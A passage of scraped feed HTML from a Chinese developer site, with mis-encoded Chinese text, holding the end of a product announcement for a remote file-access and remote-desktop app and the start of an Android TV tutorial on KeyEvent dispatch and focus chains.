<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5af11c4eee74ed1b56161c2033645a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=Wv2jVMAN1rR5RpQBHEwM5Y4Wpdo%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰æ·»åŠ ä¸€å°æ–°è®¾å¤‡æ„å‘³ç€ä½ è¦æ‡‚ç½‘ç»œçŸ¥è¯†ï¼šæ‰‹åŠ¨æŸ¥è¯¢å†…ç½‘IPåœ°å€ã€å¡«å†™å¤æ‚çš„ç«¯å£å·ã€é…ç½®è·¯ç”±å™¨ç«¯å£è½¬å‘</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30364d7e59b141b48866b1bd5999b14d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=1aoUz0vBvy%2BZvGXPNrU1zTIljLs%3D" alt="" loading="lazy"/></p>
<p>åªéœ€æ‰«ç æˆ–æ‰‹æœºå·ç™»å½•ï¼Œå®¢æˆ·ç«¯å°±ä¼šè‡ªåŠ¨æ‰«æå±€åŸŸç½‘ï¼Œé€šè¿‡è®¾å¤‡æŒ‡çº¹åº“ï¼ˆå¦‚ç¾¤æ™–DSMã€å¨è”é€šQTSçš„é»˜è®¤ç«¯å£ï¼‰ç²¾å‡†è¯†åˆ«è®¾å¤‡ç±»å‹ï¼Œå¹¶è‡ªåŠ¨ç”ŸæˆæœåŠ¡å¡ç‰‡ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35acae8e1990496daad0ab62de396cfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=B4hCW0XrA3857B1M6W7jitGsTeA%3D" alt="" loading="lazy"/></p>
<p>æ•´ä¸ªè¿‡ç¨‹å°±åƒç»™æµè§ˆå™¨æ·»åŠ ä¹¦ç­¾ä¸€æ ·ç®€å•ï¼Œ<strong>ä½ çœ‹åˆ°çš„ä¸å†æ˜¯å†·å†°å†°çš„IPåœ°å€ï¼Œè€Œæ˜¯NASã€å…¬å¸ç”µè„‘è¿™æ ·çš„ç›´è§‚æ ‡è¯†ã€‚</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f97431af09ca4150891d43698a4da40f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=IjWF73w1n641tDpnUKY3VUn2mf8%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰çš„åŠŸèƒ½å…¥å£è¾ƒå¤šï¼Œå¾ˆå¤šç”¨æˆ·è¿›äº†è½¯ä»¶ä¸çŸ¥é“è¯¥ç‚¹å“ªé‡Œã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87e3a40f24f745628dac884bb544b476~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=Rcuv60czO4KXsgxjXg8CmGvR81g%3D" alt="" loading="lazy"/></p>
<p>æ–°å‡çº§çš„4.0ç‰ˆæœ¬å¯¹é¦–é¡µè¿›è¡Œäº†å¤§åˆ€é˜”æ–§çš„æ”¹é©ï¼Œç æ‰å†—ä½™ï¼Œ<strong>æ–°å¢ä¸¤å¤§æ ¸å¿ƒåŠŸèƒ½å…¥å£ï¼šè¿œç¨‹æ–‡ä»¶å’ŒåŸç”Ÿè¿œç¨‹æ¡Œé¢ã€‚</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5610e51ddeb45b39984028a90b7bcb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=l4Kik2o35RKjAevySw3YaTbt7MU%3D" alt="" loading="lazy"/></p>
<p>**è¿œç¨‹æ–‡ä»¶ï¼š<strong>å°±åƒä¸€æŠŠé’¥åŒ™ï¼Œç›´æ¥æ‰“å¼€è¿œç¨‹ç”µè„‘çš„æŠ½å±‰ã€‚åŸç”Ÿè¿œç¨‹æ¡Œé¢</strong>ï¼š**å°±åƒä¸€ä¸ªé¥æ§å™¨ï¼Œç›´æ¥æ“æ§è¿œç¨‹ç”µè„‘çš„å±å¹•ã€‚</p>
<p><strong>æƒ³å¹²ä»€ä¹ˆï¼Œç‚¹è¿›å»å°±æ˜¯ï¼Œé€»è¾‘æ¸…æ™°ï¼Œä¸€æ­¥åˆ°ä½ï¼</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8a297825a6f4374a3be9d36e482a1e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=BZfGu3Wt7Rzr7i3PgTSs5pvE89A%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰è®¿é—®NASé‡Œçš„æ–‡ä»¶ï¼Œä½ å¾—æ˜¯åŠä¸ªç½‘ç»œå·¥ç¨‹å¸ˆï¼Œå¾—é…ç½®SMBã€WebDAVï¼Œç”šè‡³è¿˜å¾—ç”¨å‘½ä»¤è¡Œã€‚ç°åœ¨èŠ‚ç‚¹å°å®4.0ç‰ˆæœ¬å†…ç½®äº†å¯è§†åŒ–çš„æ–‡ä»¶æµè§ˆå™¨ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9349e0f271c41138b5a177b9ca702ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=BbV9EpDM61vH%2BbbXq6n6iie5kZ4%3D" alt="" loading="lazy"/></p>
<p>ä½ è®¿é—®å®¶é‡Œçš„NASï¼Œå°±åƒåœ¨ç¿»è‡ªå·±æ‰‹æœºé‡Œçš„ç›¸å†Œä¸€æ ·ã€‚ç›®å½•ç»“æ„ä¸€ç›®äº†ç„¶ï¼Œæ–‡ä»¶ç¼©ç•¥å›¾ç›´æ¥å±•ç¤ºï¼Œç‚¹å‡»å³å¯é¢„è§ˆã€ä¸‹è½½æˆ–ç®¡ç†ã€‚<strong>ä¸æ‡‚æŠ€æœ¯çš„å°ç™½ç”¨æˆ·ï¼Œä¹Ÿèƒ½ç§’ä¸Šæ‰‹ï¼</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af5e819ec22043cfad40b4c4bac5f266~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=PIOQKn%2Fa%2FIO%2F0gNqOchBhbRKuhg%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰ç”¨æ‰‹æœºè¿œç¨‹æ§åˆ¶ç”µè„‘ï¼Œç”µè„‘ç«¯è¦è£…æœåŠ¡ï¼Œæ‰‹æœºç«¯ä¹Ÿè¦ä¸‹è½¯ä»¶ï¼Œè®¾ç½®å¤æ‚ï¼Œè¿˜ç»å¸¸è¿ä¸ä¸Šã€‚</p>
<p><strong>ç°åœ¨èŠ‚ç‚¹å°å®4.0ç‰ˆæœ¬å¢åŠ äº†è¿œç¨‹æ¡Œé¢æ¨¡å—ã€‚</strong></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9cba87bcdf846ceaaa85e9a004888e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=D58%2Fq6ml5VHGkmNmtI8CII3Pj5Y%3D" alt="" loading="lazy"/></p>
<p>ç”µè„‘ç«¯ä¸€é”®å¼€å¯æœåŠ¡ï¼Œæ‰‹æœºç«¯ç»“åˆç³»ç»Ÿçº§æ¡Œé¢Appï¼Œå³å¯è·å¾—æµç•…çš„è¿œç¨‹æ§åˆ¶ä½“éªŒã€‚æˆ‘ä»¬æ·±åº¦é›†æˆäº†ç³»ç»Ÿåè®®ï¼ˆWindows RDPã€macOS Screen Sharingï¼‰ï¼Œå¤§å¹…é™ä½äº†å»¶è¿Ÿï¼Œæå‡äº†æ“æ§çš„è·Ÿæ‰‹åº¦ï¼</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8bdc9bbd95b4deb9803e9ee3ac3b5a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=kAhDghCOJcMDjI0qMShsD1GqY98%3D" alt="" loading="lazy"/></p>
<p>è™½ç„¶ä½“éªŒå˜ç®€å•äº†ï¼Œä½†æˆ‘ä»¬çš„æŠ€æœ¯åº•å±‚å˜å¾—æ›´ç¡¬æ ¸äº†ã€‚</p>
<p><strong>æ™ºèƒ½è®¾å¤‡å‘ç°ï¼š</strong> ç»“åˆUDPå¹¿æ’­ã€mDNSåè®®å’Œäº‘ç«¯è®¾å¤‡ç‰¹å¾åº“ï¼Œèƒ½ç©¿é€å¤æ‚ç½‘ç»œç¯å¢ƒã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ab247caa7d74baabf80ce2ca8935729~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=Eh6a7Oj7g0vddlYkkcsU2oKhlu8%3D" alt="" loading="lazy"/></p>
<p><strong>å¤šåè®®è‡ªé€‚åº”å¼•æ“ï¼š</strong> æ–‡ä»¶æµè§ˆå™¨èƒ½è‡ªåŠ¨è¯†åˆ«å¹¶é€‰æ‹©æœ€ä¼˜ä¼ è¾“åè®®ï¼ˆSMB/WebDAVï¼‰ï¼Œå¹¶æ”¯æŒå…ƒæ•°æ®ç¼“å­˜ï¼ŒäºŒæ¬¡è®¿é—®é€Ÿåº¦æå‡300%ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/564646b6dec44ead8c2ff3f246ff076b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=IJ1ZSb246CNG7ntHynfQx3FpRUA%3D" alt="" loading="lazy"/></p>
<p><strong>å¹¿æ³›å…¼å®¹æ€§ï¼š</strong> å…¨é¢æ”¯æŒ Windowsã€macOSã€ç¾¤æ™–ã€å¨è”é€šã€é“å¨é©¬ã€æç©ºé—´ã€ç»¿è”äº‘ã€é£ç‰›NASç­‰ä¸»æµè®¾å¤‡ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b952c7d3235c4ce8b7783ec3605aca84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=mAG2fbxxTySMoYxXrUUPBxRNcW0%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android KeyEventä¼ é€’ä¸ç„¦ç‚¹æ‹¦æˆª]]></title>    <link>https://juejin.cn/post/7592451588849270803</link>    <guid>https://juejin.cn/post/7592451588849270803</guid>    <pubDate>2026-01-08T03:50:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588849270803" data-draft-id="7577050643203997746" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android KeyEventä¼ é€’ä¸ç„¦ç‚¹æ‹¦æˆª"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:50:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ—¶å…‰å°‘å¹´"/> <meta itemprop="url" content="https://juejin.cn/user/923245500710296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android KeyEventä¼ é€’ä¸ç„¦ç‚¹æ‹¦æˆª
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/923245500710296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ—¶å…‰å°‘å¹´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:50:52.000Z" title="Thu Jan 08 2026 03:50:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f9a6ac0bf2e4a4c8a9743e1660f3e56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pe25YWJ5bCR5bm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449294&amp;x-signature=3TrzgICa%2BUZmyf05oA6PfjPk4Lo%3D" alt="ä¼ä¸šå¾®ä¿¡20260108-114942@2x.png" loading="lazy"/></p>
<p>åœ¨ç§»åŠ¨è®¾å¤‡ï¼ˆå¦‚æ‰‹æœºã€å¹³æ¿ï¼‰ä¸Šï¼Œç”¨æˆ·ä¸»è¦é€šè¿‡è§¦æ‘¸å±ä¸åº”ç”¨äº¤äº’ï¼Œæ‰‹æŒ‡ç‚¹å‡»å“ªé‡Œï¼Œç„¦ç‚¹å°±åœ¨å“ªé‡Œã€‚ä½†åœ¨ç”µè§†è¿™ç§å¤§å±ã€è¿œè·ç¦»äº¤äº’çš„åœºæ™¯ä¸‹ï¼Œè§¦æ‘¸ä¸å†é€‚ç”¨ï¼Œç”¨æˆ·ä¸»è¦ä½¿ç”¨é¥æ§å™¨ï¼ˆæ–¹å‘é”®ã€ç¡®è®¤é”®ã€è¿”å›é”®ç­‰ï¼‰è¿›è¡Œå¯¼èˆªã€‚</p>
<p>å®é™…ä¸Šï¼Œè¿™ç§äº¤äº’é€šè¿‡KeyEventï¼Œè€ŒTVçš„ç„¦ç‚¹å’ŒKeyEventæœ‰ç€éå¸¸ç´§å¯†çš„å…³ç³»ï¼Œé€šå¸¸æ„ä¹‰ä¸Šï¼ŒKeyEventè§¦å‘Focusçš„å˜åŒ–ã€‚åœ¨Android åº”ç”¨å¼€å‘ä¸­ï¼Œç„¦ç‚¹+KeyEventæ¨¡å¼çš„æ¡†æ¶ä¸‹ï¼Œäº¤äº’éš¾åº¦å…¶å®è¦è¶…è¿‡è§¦æ‘¸äº‹ä»¶ã€‚</p>
<h2 data-id="heading-1">å¸¸è§é—®é¢˜</h2>
<p>ä¸è¿‡ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæœ€è®©äººå¤´ç–¼çš„â€å¾ˆéš¾â€œæ§åˆ¶èµ°å‘ï¼Œä¸è¿‡å¥½æ¶ˆæ¯æ˜¯ï¼ŒAndroidå®˜æ–¹æ¨å‡ºçš„Compose UIåœ¨è¿™æ–¹é¢è¿›æ­¥å¾ˆå¤šï¼Œä½¿å¾—ç„¦ç‚¹è½¬ç§»ç›®æ ‡æ›´åŠ æ˜ç¡®ï¼Œç„¦ç‚¹é—®é¢˜è¦æ¯”ä¼ ç»ŸViewå¼€å‘çš„å°‘å¾ˆå¤šã€‚</p>
<p>ä½œä¸ºâ€œè¿œå¤UIçš„appâ€çš„å¼€å‘è€…ï¼Œæˆ‘ä»¬è‡ªç„¶æ— æ³•ç«‹åˆ»è½¬å‘Compose UIå¼€å‘ï¼Œè¿™ä¹Ÿæ˜¯è¡Œä¸šç°çŠ¶äº†å§ã€‚å¥½äº†ï¼Œè¿›å…¥ä¸»é¢˜ï¼Œæˆ‘ä»¬ä»Šå¤©é‡ç‚¹æ€»ç»“ä¸€ä¸‹ç„¦ç‚¹çš„ç›¸å…³é—®é¢˜ã€‚</p>
<h3 data-id="heading-2">ç„¦ç‚¹åˆ†é…</h3>
<p>è°ˆåˆ°ç„¦ç‚¹åˆ†é…ï¼Œæˆ‘ä»¬é¦–å…ˆè¦äº†è§£ä¸‹KeyEventçš„äº‹ä»¶ä¼ é€’ï¼Œå…¶å®å’Œè§¦æ‘¸å±ç›¸æ¯”,KeyEventä¼ é€’è¦ç›¸å¯¹ç®€å•ä¸€ç‚¹ï¼ŒKeyEventçš„ä¸»è¦ä¼ é€’æ–¹å‘æ˜¯å‘â€œå¸¦ç„¦ç‚¹çš„Viewâ€ä¼ é€’ï¼ŒåŸºæœ¬ä¸å­˜åœ¨åˆ†å‘é€»è¾‘ï¼Œå½“ç„¶ï¼Œã€ä¸Šã€‘ã€ä¸‹ã€‘ã€å·¦ã€‘ã€å³ã€‘æ–¹å‘é”®æ˜¯é™¤å¤–çš„ã€‚</p>
<h4 data-id="heading-3">äº‹ä»¶ç±»å‹æ€»ç»“</h4>
<ul>
<li>æ™®é€šäº‹ä»¶ï¼š ç›´æ¥é¡ºç€"ç„¦ç‚¹é“¾"å‘å¸¦ç„¦ç‚¹çš„Viewä¼ é€’</li>
<li>ç‚¹å‡»äº‹ä»¶ï¼š å¿«é€Ÿç‚¹å‡»ã€ç¡®è®¤ã€‘ã€å›è½¦ã€‘ã€Centerã€‘å°±ä¼šå°†äº‹ä»¶è½¬ä¸ºTouchäº‹ä»¶ï¼Œæœ€ç»ˆè§¦å‘ç‚¹å‡»äº‹ä»¶ï¼Œæ³¨æ„ï¼Œå¦‚æœæ˜¯å…¶ä»–æŒ‰é”®ï¼Œæ˜¯ä¸ä¼šè½¬åŒ–ä¸ºTouchäº‹ä»¶çš„</li>
<li>é•¿æŒ‰äº‹ä»¶ï¼šé•¿æŒ‰ã€ç¡®è®¤ã€‘ã€å›è½¦ã€‘ã€Centerã€‘å°±ä¼šå°†äº‹ä»¶è½¬ä¸ºTouchäº‹ä»¶ï¼Œæœ€ç»ˆè§¦å‘é•¿æŒ‰äº‹ä»¶ï¼Œæ³¨æ„ï¼Œå¦‚æœæ˜¯å…¶ä»–æŒ‰é”®ï¼Œä¼šè§¦å‘å¤šæ¬¡è¿ç»­ç‚¹å‡»ï¼Œå¹¶ä¸å­˜åœ¨é•¿æŒ‰äº‹ä»¶</li>
<li>æ–¹å‘æŒ‰é”®ï¼šå¸¦æ–¹å‘çš„æŒ‰é”®è¢«ç‚¹å‡»åï¼Œé¦–å…ˆé¡ºç€â€ç„¦ç‚¹é“¾â€œå‘å¸¦ç„¦ç‚¹çš„Viewï¼Œå¦‚æœæ²¡æœ‰å¤„ç†ï¼Œåˆ™è¿›å…¥åˆ†å‘æµç¨‹ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå…¶ä»–æŒ‰é”®æ²¡æœ‰åˆ†å‘æµç¨‹çš„ã€‚</li>
</ul>
<h4 data-id="heading-4">ç„¦ç‚¹é“¾</h4>
<p>å¥½å§ï¼Œä¸Šé¢çš„æè¿°ä¸­ï¼Œæœ‰ä¸ªã€ç„¦ç‚¹é“¾ã€‘ï¼Œè¿™æ˜¯æˆ‘ä¸ªäººçš„å«æ³•ï¼Œæˆ‘ç¡®å®ä¸çŸ¥é“åˆ«äººä¼šæ€ä¹ˆèµ·åå­—ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯ç„¦ç‚¹é“¾å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ä¸€ä¸ªUIç•Œé¢ä¸­ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªViewä¼šæœ‰ç„¦ç‚¹ï¼Œä½†æ˜¯ï¼ŒæŒ‰ç…§ä¼ ç»Ÿçš„æƒ³æ³•ï¼Œè®©æ‰€æœ‰Viewå»findFocusæŸ¥è¯¢è¿™ä¸ªç„¦ç‚¹çš„æ—¶å€™ï¼Œè¦ä¹ˆæ˜¯éå†Viewæ ‘ï¼Œä½†Androidæ˜¯å¹¶æ²¡æœ‰ï¼Œæ¯•ç«ŸViewå¢å¤šä¼šæ˜¾è‘—æå‡æŸ¥è¯¢æ—¶é—´ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¯èƒ½æœ‰äººä¼šæƒ³ï¼Œä¿å­˜æˆå•ä¾‹ä¸å¥½ä¹ˆï¼Œä½†å‡ºäºMemoryLeakçš„è€ƒè™‘ï¼Œå®˜æ–¹å¹¶ä¸è®¤å¯è¿™ç§åšæ³•ï¼Œåè€Œé€‰æ‹©äº†å¦ä¸€ç§åšæ³•ï¼Œé‚£å°±æ˜¯ã€ç„¦ç‚¹é“¾ã€‘ã€‚</p>
<p>åŸç†æ˜¯åœ¨æ¯ä¸€ä¸ªçˆ¶å¸ƒå±€ä¸­ï¼Œå®šä¹‰ä¸€ä¸ªmFocusedå˜é‡ï¼Œä¿å­˜ä¸‹ä¸€çº§è·¯å¾„ViewèŠ‚ç‚¹ï¼Œæœ€ç»ˆï¼Œå½“æŸViewèšç„¦æ—¶ï¼Œå°±ä¼šå½¢æˆä¸‹é¢çš„é“¾æ¡</p>
<blockquote>
<p>mFocused-&gt;mFocused-&gt;mFocused-&gt;mFocused</p>
</blockquote>
<p>åœ¨ç„¦ç‚¹é“¾ä¸­ï¼Œåªæœ‰æœ«ç«¯çš„mFocusedæ‰å…·å¤‡ç„¦ç‚¹ï¼Œé€šè¿‡è¿™ç§é“¾å¼çš„é“¾æ¥ï¼Œæœ‰æ•ˆå‡å°‘äº†æŸ¥è¯¢æ—¶é—´ï¼Œä¹Ÿèƒ½å®Œç¾çš„é¿å…MemoryLeak</p>
<p>ä¸‹é¢ï¼Œåœ¨å›å¤´çœ‹ViewGroupçš„æºç ï¼Œä½ æ˜¯ä¸æ˜¯å°±èƒ½æƒ³å¾—é€šKeyEventçš„äº‹ä»¶ä¼ é€’æ–¹å¼äº†</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">dispatchKeyEvent</span><span class="hljs-params">(KeyEvent event)</span> {
